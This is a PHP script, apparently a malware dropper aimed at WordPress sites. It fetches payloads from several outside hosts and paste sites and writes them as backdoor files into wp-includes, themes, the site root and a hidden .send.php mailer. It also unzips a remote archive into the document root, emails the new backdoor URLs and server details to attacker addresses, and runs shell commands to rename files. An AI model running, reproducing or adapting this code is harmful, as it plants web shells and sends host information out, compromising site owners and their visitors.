<?php
echo '<center><h1>IDBTE4M CODE 87</h1>'.'<br>'.'[uname] '.php_uname().' [/uname] ';
ignore_user_abort(true);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('max_execution_time',0);
ini_set('memory_limit', '64M');
$sys = php_uname();
$lihat = getcwd();
$home = $_SERVER['DOCUMENT_ROOT'];
$domen = $_SERVER['SERVER_NAME'];
$tempat = $_SERVER['REQUEST_URI'];
function http_get($url){
$im = curl_init($url);
curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($im, CURLOPT_HEADER, 0);
return curl_exec($im);
curl_close($im);
}
$check1 = $home . '/wp-includes/js/include.php' ;
$text1 = http_get('http://ndot.us/za');
$open1 = fopen($check1, 'w');
fwrite($open1, $text1);
fclose($open1);
if(file_exists($check1)){
}
$check2 = $home . '/wp-content/themes/themes.php' ;
$text2 = http_get('http://132.232.113.243/wget/index.txt');
$open2 = fopen($check2, 'w');
fwrite($open2, $text2);
fclose($open2);
if(file_exists($check2)){
}
$check3 = $home . '/wp-config-sample.php';
$text3 = http_get('https://pastecode.xyz/view/raw/86ded0b5');
$open3 = fopen($check3, 'w');
fwrite($open3, $text3);
fclose($open3);
if(file_exists($check3)){
}
$check21 = $home . '/index2.php';
$text21 = http_get('http://132.232.113.243/wget/index.txt');
$open21 = fopen($check21, 'w');
fwrite($open21, $text21);
fclose($open21);
if(file_exists($check21)){
}
$mailer = $home . '/.send.php';
$ambila = http_get('https://pastebin.com/raw/fJvQSbPY');
$bukaa = fopen($mailer, 'w');
fwrite($bukaa, $ambila);
fclose($bukaa);
if(file_exists($mailer)){
}

copy('http://94.130.180.143/get/87.zip',$_SERVER['DOCUMENT_ROOT']."/87.zip");
$zip = new ZipArchive;
if ($zip->open($_SERVER['DOCUMENT_ROOT']."/87.zip") === TRUE) {
    $zip->extractTo($_SERVER['DOCUMENT_ROOT']."/");
    $zip->close();
} else {
}
header('Content-Type: text/html; charset=UTF-8');
$tujuanmail = 'ozy.1337@outlook.com,jembot.kisut@gmail.com,tesemelgan@gmail.com,bahissyahri@gmail.com,elrobn403@gmail.com';
$x_path = "http://" . $domen . "/wp-includes/js/include.php\nhttp://" . $domen . "/87/5.php\nhttp://" . $domen . "/index2.php?wanna_play_with_me\nhttp://" . $domen . $tempat . "\r\n" . $lihat;
mail($tujuanmail, $sys, $x_path);
@system('mv wlw-copy.php -+.php');
@system('wordfence-waw.php -+.php');
@system('mv db.copy.php -+.php');
unlink('87.zip');
?>
